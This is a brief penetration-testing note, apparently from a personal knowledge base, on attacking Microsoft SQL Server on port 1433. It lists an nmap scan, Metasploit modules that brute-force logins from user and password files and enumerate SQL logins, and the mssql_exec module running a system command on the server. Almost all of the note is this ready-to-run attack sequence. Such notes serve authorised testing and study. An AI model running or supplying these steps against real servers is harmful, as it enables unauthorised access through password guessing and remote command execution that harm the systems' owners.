---
up: "[[SQL]]"
---

# MSSQL- Metasploit

Port 1433

```bash
nmap -sV -p 1433 --script ms-sql-info
```

Using metasploit to brute force user and passwords:

```bash
> use auxiliary/scanner/mssql/mssql_login
> set user_file users.txt
> set pass_file pass.txt
> run
```

```bash
> use auxiliary/admin/mssql/mssql_enum
> use auxiliary/admin/mssql/mssql_enum_sql_logins
> set user_file users.txt
> set pass_file pass.txt
> run
```

```bash
> use auxiliary/admin/mssql/mssql_exec
> set cmd whoami
> run
```
